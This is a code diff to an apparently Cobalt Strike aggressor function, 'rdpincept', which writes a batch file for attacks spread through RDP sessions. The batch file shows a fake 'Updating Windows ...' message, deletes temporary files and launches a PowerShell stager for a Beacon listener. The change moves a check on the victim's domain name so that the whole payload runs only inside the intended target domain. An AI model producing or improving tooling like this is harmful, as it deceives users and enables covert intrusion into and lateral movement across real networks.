@@ -16,6 +16,12 @@ sub rdpincept {
         blog($beacon, "RDPIncepting listener: $listener");
         $buffer = "@echo off\r\n";
 
+        # Keying by Domain
+
+		if ($domain){
+			$buffer = $buffer . "If \"" . $domain . "\"==\"%USERDOMAIN%\" (";
+		}
+		
         $buffer = $buffer . "echo Updating Windows ...";
 
 		$buffer = $buffer . "timeout 1 >nul 2>&1\r\n";
@@ -42,14 +48,11 @@ sub rdpincept {
 
 		$buffer = $buffer . "del /q %TEMP%\\temp_00.txt >nul 2>&1\r\n";
 
-		# Keying by Domain
-
-		if ($domain){
-			$buffer = $buffer . "If \"" . $domain . "\"==\"%USERDOMAIN%\" (";
-        	$buffer = $buffer . powershell($listener, false) . ")";
-        }
-        else{
-        	$buffer = $buffer . powershell($listener, false);
+		
+        $buffer = $buffer . powershell($listener, false);
+        
+        if ($domain){
+        	$buffer = $buffer . ")";
         }
 
         blog($beacon, $buffer);
